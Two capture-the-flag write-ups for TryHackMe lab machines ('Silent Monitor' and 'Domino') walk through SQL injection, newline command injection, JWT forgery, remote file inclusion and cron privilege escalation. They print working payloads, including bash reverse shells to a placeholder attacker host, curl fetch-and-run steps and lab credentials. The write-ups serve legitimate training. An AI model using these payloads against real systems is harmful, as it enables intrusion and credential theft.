TryHackMe — Silent Monitor

Linux boot2root built around a Flask NOC portal. SQL injection for initial access, newline-based command injection to escape a filtered ping utility, credential hunting in app source and config files, and offline KeePass cracking to recover the root password. 2 / 2 flags.

TryHackMe Medium 2 / 2 Flags Linux Boot2Root

// 01 — recon

Nmap revealed SSH (22) and a Werkzeug/Flask app on port 5050 — "CorpNet Network Operations Centre". Gobuster found a single endpoint: /internal.

nmap -sC -sV -p- <target-ip> gobuster dir -u http://<target-ip>:5050 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

// 02 — SQL injection → login bypass

/internal presented a login form. The app built SQL queries via direct string concatenation with no parameterisation. Submitting ' OR 1=1-- as the username bypassed authentication entirely:

SELECT id, username, role FROM users WHERE username = '' OR 1=1--' AND password = '...'

The ' closed the string, OR 1=1 made the condition always true, and -- commented out the rest including the password check. Logged in as netops with operator role.

SQLiAuth BypassNo Parameterisation

// 03 — command injection via newline bypass

The dashboard exposed a Host Health Check running ping -c 2 -W 1 <input> via Python's subprocess with shell=True. The audit log showed a previous operator had attempted %0a injection. The filter blocked ;, |, backticks, $, and & — but not newlines.

Intercepted the POST request in Burp Suite and injected %0a to terminate ping and run a second command:

target=127.0.0.1%0awhoami

Response confirmed execution as www-data.

Command InjectionNewline Bypassshell=True

// 04 — reverse shell (filter bypass)

Direct reverse shell payloads failed because > and & were filtered. Bypassed by hosting a shell script and fetching it with curl — no special characters in the injected commands:

# Attack machine echo 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' > shell.sh python3 -m http.server 80 nc -lvnp 4444
# Burp — fetch script target=127.0.0.1%0acurl%20http://<attacker>/shell.sh%20-o%20/tmp/s.sh # Burp — execute target=127.0.0.1%0abash%20/tmp/s.sh

Reverse shell received as www-data.

RCEFilter Bypasscurl + bash

// 05 — credential hunting → user flag

Enumerating /opt/netops/ revealed two critical files. app.py contained a hardcoded MD5 password hash. secret.config contained plaintext credentials for the backup agent:

[backup_agent] run_as = sysadmin password = S3cur3Backup$Acc3ss!

SSH as sysadmin with S3cur3Backup$Acc3ss! succeeded. User flag retrieved.

Cleartext CredentialsConfig File Exposure

// 06 — KeePass cracking → root flag

/home/sysadmin/backups/ contained infrastructure.kdbx — a KeePass credential database. Transferred it to the attack machine and cracked the master password offline:

keepass2john infrastructure.kdbx > keepass.hash john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt # Master password: spring
keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive" # Password: S3cur3P4ss0nK33p4ss

SSH as root was blocked (PermitRootLogin no). Used su root from the sysadmin session. Root flag retrieved.

KeePassOffline Crackingjohn

// attack chain

—SQLi login bypass (' OR 1=1--) → netops operator session
—Newline injection in ping → command execution as www-data
—curl + bash filter bypass → reverse shell
F1secret.config plaintext creds → SSH as sysadmin → user flag
F2KeePass database → offline crack (john) → root password → su root → root flag

TryHackMe — Domino

Full web exploitation chain on a Linux box — JS recon to root in 8 steps. Covers AES-ECB decryption, credential brute force, IDOR, XSS cookie hijack, JWT algorithm confusion, remote file inclusion, and cron-based privilege escalation. 5 / 5 flags.

TryHackMe Medium 5 / 5 Flags Linux Boot2Root

// 01 — recon

Nmap revealed SSH (22) and Apache HTTP (80). Gobuster found five key directories: /backup, /admin, /api, /support, and /static.

nmap -sC -sV -p- <target-ip> gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

// 02 — JS recon & AES-ECB decryption

Reviewing /static/app.js revealed a hardcoded AES-128-ECB key left in a TODO comment. The /backup/ endpoint exposed config.enc. The key is 14 bytes — padded with 2 null bytes and decrypted:

openssl enc -d -aes-128-ecb -nosalt -nopad \ -K 4e337875734b33793230323421210000 \ -in config.enc
{"system_user":"devops", ...}
CWE-321Hardcoded KeyAES-ECB

// 03 — brute force & IDOR → flag 1

Team page exposed all employee names in firstname.lastname format. Hydra cracked three accounts — all using password. Logged in as robert.wilson. Profile API used sequential IDs — changing ?id=4 to ?id=1 returned Laura Hayes' profile containing Flag 1.

hydra -q -u -L usernames.txt -P rockyou.txt <ip> \ http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"
Brute ForceIDORBroken Access Control

// 04 — XSS cookie hijack → flag 2

An admin bot polled support tickets every 15 seconds and visited URLs in message bodies using Laura's admin session cookie (HttpOnly: false). Created a ticket with a URL pointing to a Netcat listener — bot visited it, listener captured Laura's cookie. Swapping it in the browser revealed Flag 2 at /admin/index.php.

Stored XSSSession HijackingHttpOnly: false

// 05 — JWT alg:none bypass

The File Viewer API required an admin JWT. The server trusted the alg field in the token header without validation. Forged a token with alg:none and role:admin — empty signature accepted:

H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=') P=$(echo -n '{"sub":"robert.wilson","role":"admin",...}' | base64 | tr '+/' '-_' | tr -d '=') echo "$H.$P."
JWT Algorithm ConfusionSignature Not Verified

// 06 — RFI → reverse shell → flag 3

/api/files.php source revealed it fetched remote URLs and passed them to eval(). Hosted a PHP reverse shell and triggered it via the API:

curl -H "Authorization: Bearer <forged_jwt>" \ "http://<target>/api/files.php?name=http://<attacker>/shell.php"

Reverse shell as www-data. Flag 3 at /opt/flag3.txt.

RFIeval() on remote inputRCE

// 07 — cleartext creds → devops → flag 4

An obscurely named PHP file in the web root contained hardcoded DB credentials: D3v0ps!2024. Combined with system_user: devops from the decrypted config — su devops succeeded. Flag 4 at /home/devops/user.txt.

Cleartext CredentialsPassword Reuse

// 08 — writable cron script → root → flag 5

pspy64 showed root running /opt/monitoring/health_report.sh every minute. The devops group had write access. Appended a bash reverse shell — root shell received within one minute.

echo 'bash -i >& /dev/tcp/<attacker>/5555 0>&1' \ >> /opt/monitoring/health_report.sh
Writable Cron ScriptPrivilege Escalation
